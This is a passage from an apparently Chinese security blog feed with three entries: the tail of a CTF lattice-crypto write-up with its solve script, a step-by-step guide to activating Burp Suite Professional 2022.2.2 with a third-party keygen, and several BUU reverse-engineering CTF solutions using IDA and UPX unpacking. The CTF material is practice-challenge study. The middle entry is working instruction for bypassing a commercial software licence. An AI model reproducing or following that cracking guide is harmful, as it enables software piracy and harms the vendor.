punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    c <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c ="</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>new_encrypt<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token comment">#e = [151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token comment">#W = [-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]</span></pre></td></tr><tr><td data-num="56"></td><td><pre><span class="token comment">#[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]</span></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token comment">#[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token comment">#[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token comment">#[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment">#[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token comment">#[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token comment">#[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token comment">#[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token comment">#c =1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9oeHAuaW8vYmxvZy8yNi9Wb2xnYUNURi0yMDE2LVF1YWxzLWNyeXB0bzMwMC1YWFktd3JpdGV1cC8=">谷歌上搜到个原题</span></p>
<p><strong>exp.sage:</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> sage<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>free_module_integer <span class="token keyword">import</span> IntegerLattice</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> binascii</pre></td></tr><tr><td data-num="5"></td><td><pre>w <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'[-10150241248 -11679953514  -8802490385 -12260198788 -10290571893   -334269043 -11669932300  -2158827458     -7021995]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token string">'[ 52255960212  48054224859  28230779201  43264260760  20836572799   8191198018  14000400181   4370731005     14251110]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>         <span class="token string">'[  2274129180  -1678741826  -1009050115   1858488045    978763435   4717368685   -561197285  -1999440633     -6540190]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>         <span class="token string">'[ 45454841384  34351838833  19058600591  39744104894  21481706222  14785555279  13193105539   2306952916      7501297]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>         <span class="token string">'[-16804706629 -13041485360  -8292982763 -16801260566  -9211427035  -4808377155  -6530124040  -2572433293     -8393737]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre>         <span class="token string">'[ 28223439540  19293284310   5217202426  27179839904  23182044384  10788207024  18495479452   4007452688     13046387]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>         <span class="token string">'[   968256091  -1507028552   1677187853   8685590653   9696793863   2942265602  10534454095   2668834317      8694828]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre>         <span class="token string">'[ 33556338459  26577210571  16558795385  28327066095  10684900266   9113388576   2446282316   -173705548      -577070]'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre>         <span class="token string">'[ 35404775180  32321129676  15071970630  24947264815  14402999486   5857384379  10620159241   2408185012      7841686]'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    W<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> w<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        temp<span class="token operator">=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> temp<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        W<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        </pre></td></tr><tr><td data-num="20"></td><td><pre>W<span class="token operator">=</span>matrix<span class="token punctuation">(</span>W<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>e<span class="token operator">=</span><span class="token string">'[151991736758354 115130361237591  58905390613532 130965235357066  74614897867998  48099459442369  45894485782943   7933340009592     25794185638]'</span></pre></td></tr><tr><td data-num="22"></td><td><pre>E<span class="token operator">=</span>e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> E<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>e<span class="token operator">=</span>matrix<span class="token punctuation">(</span>e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>B <span class="token operator">=</span> W<span class="token punctuation">.</span>stack<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>augment<span class="token punctuation">(</span>vector<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> W<span class="token punctuation">.</span>ncols<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>d <span class="token operator">=</span> IntegerLattice<span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">.</span>shortest_vector<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'d = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>d<span class="token operator">=</span>vector<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>xxx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">151991736758357</span><span class="token punctuation">,</span> <span class="token number">115130361237593</span><span class="token punctuation">,</span> <span class="token number">58905390613535</span><span class="token punctuation">,</span> <span class="token number">130965235357066</span><span class="token punctuation">,</span> <span class="token number">74614897868001</span><span class="token punctuation">,</span> <span class="token number">48099459442367</span><span class="token punctuation">,</span> <span class="token number">45894485782941</span><span class="token punctuation">,</span> <span class="token number">7933340009592</span><span class="token punctuation">,</span> <span class="token number">25794185636</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="32"></td><td><pre>m <span class="token operator">=</span> W<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>vector<span class="token punctuation">(</span>xxx<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'m = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">877</span><span class="token punctuation">,</span> <span class="token number">619</span><span class="token punctuation">,</span> <span class="token number">919</span><span class="token punctuation">,</span> <span class="token number">977</span><span class="token punctuation">,</span> <span class="token number">541</span><span class="token punctuation">,</span> <span class="token number">941</span><span class="token punctuation">,</span> <span class="token number">947</span><span class="token punctuation">,</span> <span class="token number">1031</span><span class="token punctuation">,</span> <span class="token number">821</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre>key <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>M<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_ECB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>c<span class="token operator">=</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token string">'1070260d8986d5e3c4b7e672a6f1ef2c185c7fff682f99cc4a8e49cfce168aa0'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment">#flag&#123;be5152d04a49234a251956a32b&#125;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Burp Suite Professional 2022.2.2破解记录</title>
    <url>/article/38e1e532.html</url>
    <content><![CDATA[<p>他告诉所有人他那个叫 &quot;蒙奇.D. 路飞&quot; 的弟弟，将来一定会非常了不起呢！！！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/40674a9b33443efb20e7eb78f12dd69.png" alt="image-40674a9b33443efb20e7eb78f12dd69" /></p>
<h1 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h1>
<ul>
<li><code>Windows 10</code>  本机</li>
<li><code>Java</code>  环境， <code>jdk &gt; 11</code></li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycC9yZWxlYXNlcw==">官网下载</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306154554111.png" alt="image-20220306154554111" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2gzMTEwdzByMWQteS9CdXJwTG9hZGVyS2V5Z2VuL3JlbGVhc2Vz">Burp Suite 破解工具</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306154605685.png" alt="image-20220306154605685" /></p>
<h1 id="破解记录"><a class="anchor" href="#破解记录">#</a> 破解记录</h1>
<p>双击安装程序安装 <code>Burp Suite Professional 2022.2.2</code> ，一路默认即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155000956.png" alt="image-20220306155000956" /></p>
<p>打开 <code>Burp Suite Professional 2022.2.2</code>  安装路径</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155115105.png" alt="image-20220306155115105" /></p>
<p>将 <code>BurpLoaderKeygen.jar</code>  放在 <code>Burpsuite</code>  安装路径下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155321841.png" alt="image-20220306155321841" /></p>
<p>双击运行 <code>BurpLoaderKeygen.jar</code> ，打开 ok</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155724695.png" alt="image-20220306155724695" /></p>
<p>直接点 <code>run</code>  运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155743161.png" alt="image-20220306155743161" /></p>
<p>提示输入 <code>License key</code>  了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155846721.png" alt="image-20220306155846721" /></p>
<p><code>-&gt;Next</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306155913460.png" alt="image-20220306155913460" /></p>
<p><code>-&gt;Manual activation</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160003632.png" alt="image-20220306160003632" /></p>
<p>将 <code>request</code>  放入注册机的 <code>Activatiion Request</code>  中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160044802.png" alt="image-20220306160044802" /></p>
<p>将自动生成 <code>Response</code>  放入 <code>Burpsuite</code>  中</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160108610.png" alt="image-20220306160108610" /></p>
<p><code>-&gt;Next</code> ，激活成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160120317.png" alt="image-20220306160120317" /></p>
<p>后面一路 <code>Next</code>  就大功告成了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160145827.png" alt="image-20220306160145827" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160203398.png" alt="image-20220306160203398" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220306160223898.png" alt="image-20220306160223898" /></p>
]]></content>
      <categories>
        <category>STools</category>
      </categories>
      <tags>
        <tag>STools</tag>
      </tags>
  </entry>
  <entry>
    <title>Buu-Re刷题记录</title>
    <url>/article/c9a43e3e.html</url>
    <content><![CDATA[<p>buu 站点：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/img.php" alt="img" /></p>
<h2 id="easyre"><a class="anchor" href="#easyre">#</a> easyre</h2>
<p>ida 打开，即可得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823161802651.png" alt="image-20210823161802651" /></p>
<p>得到 flag：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>this_Is_a_EaSyRe<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="reverse1"><a class="anchor" href="#reverse1">#</a> reverse1</h2>
<p>附件拖入 ida，shift+f12</p>
<p>发现这个</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823162842814.png" alt="image-20210823162842814" /></p>
<p>跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823162916116.png" alt="image-20210823162916116" /></p>
<p>再跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823162941081.png" alt="image-20210823162941081" /></p>
<p>光标选中之后 F5 查看伪代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823163013123.png" alt="image-20210823163013123" /></p>
<p>发现这个应该是将 ASCII 为 111 的替换为 48，查询后是 o 换成 0</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823163120913.png" alt="image-20210823163120913" /></p>
<p>这里发现是 str1 接受 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823163150090.png" alt="image-20210823163150090" /></p>
<p>然后将 Str1 与 Str2 进行比较，如果相等就 <code>this is the right flag!</code></p>
<p>所以就去看看 Str2 里存的是什么，双击 Str2</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823163230185.png" alt="image-20210823163230185" /></p>
<p>明显 o 变 0 就是 flag 了</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>hell0_w0rld<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>其实拖入 ida 发现运行主程序就不难猜出 flag 了。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210823163620441.png" alt="image-20210823163620441" /></p>
<h2 id="reverse2"><a class="anchor" href="#reverse2">#</a> reverse2</h2>
<p>附件拖入 ida，查看主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824150138807.png" alt="image-20210824150138807" /> 可以看到 flag 输出的程序，双击跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824150241018.png" alt="image-20210824150241018" /></p>
<p>发现 flag 的样式，但是不难发现 flag 中存在替换，跟进加密程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824150406528.png" alt="image-20210824150406528" /></p>
<p>可以看到<strong> i 和 r 被替换成 1</strong></p>
<p>所以 flag 为：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>hack1ng_fo1_fun<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="内涵的软件"><a class="anchor" href="#内涵的软件">#</a> 内涵的软件</h2>
<p>图片有内涵，exe 也可以有内涵，也许你等不到答案，赶快行动起来吧！！！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>ida 打开查看主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824151322066.png" alt="image-20210824151322066" /></p>
<p>flag 白给系列。</p>
<h2 id="新年快乐"><a class="anchor" href="#新年快乐">#</a> 新年快乐</h2>
<p>过年了要不做个逆向题庆祝一下新年？说不定会有惊喜哦！注意：flag 并非是 flag {XXX} 形式，就是一个字符串，考验眼力的时候到了！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>ida 拖开发现套了一层壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824153007967.png" alt="image-20210824153007967" /></p>
<p>ExeinfoPE 查壳</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824153031011.png" alt="image-20210824153031011" /></p>
<p>发现有 UPX 壳，脱壳。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>大佬总结的手动脱壳，esp定律：</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span>.先单步到只有esp红色时，右键数据窗口跟随。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">2</span>.到数据窗口后，左键硬件访问，byte和word，dword都可以任选一个，</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">3</span>.F9运行，遇到大跳转，时说明我们到oep了</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">4</span>.遇到向上跳的，用F4</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">5</span>.用od自带的脱壳进程，脱，一种选重建导入表，一种不选</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">6</span>.脱壳结束</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/ad5cb1fa7438bd6bb55c5db9226a8fb.png" alt="ad5cb1fa7438bd6bb55c5db9226a8fb" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3VweC91cHgvcmVsZWFzZXMvdGFnL3YzLjk2">upx 下载</span></p>
<p>拖入 ida 中查看。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20210824154345588-16297910259171-16297910266622.png" alt="image-20210824154345588" /></p>
<p>得到 flag：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>HappyNewYear<span class="token operator">!</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="xor"><a class="anchor" href="#xor">#</a> xor</h2>
<p>or 的敌人，and 有个兄弟叫 or,or 有个敌人叫 xor，那么你能帮助 or 战胜他的敌人 xor 吗，xor 的奥秘就在附件中，开始战斗吧！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>附件下载后 ida 打开进行反汇编得到如下</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-124h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">char</span> __b<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-110h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>__b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token function">get_line</span><span class="token punctuation">(</span>__b<span class="token punctuation">,</span> <span class="token number">256LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>__b<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">goto</span> LABEL_7<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    __b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> __b<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>__b<span class="token punctuation">,</span> global<span class="token punctuation">,</span> <span class="token number">0x21uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="16"></td><td><pre>LABEL_7<span class="token operator">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322202901137.png" alt="image-20220322202901137" /></p>
<p>对主函数进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span><span class="token comment">// 可以看出 flag 为 33 位</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">33</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span><span class="token comment">// 判断程序，以此来判断 flag</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    __b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> __b<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 即 v6 [i] ^= v6 [i-1]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 可以发现 xor 的规律</span></pre></td></tr></table></figure><p>双击 <code>Success</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322203429246.png" alt="image-20220322203429246" /></p>
<p>进入如下模块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322203349270.png" alt="image-20220322203349270" /></p>
<p>选中后 <code>shift+e</code>  进行提取</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322203539649.png" alt="image-20220322203539649" /></p>
<p>得到如下字符串</p>
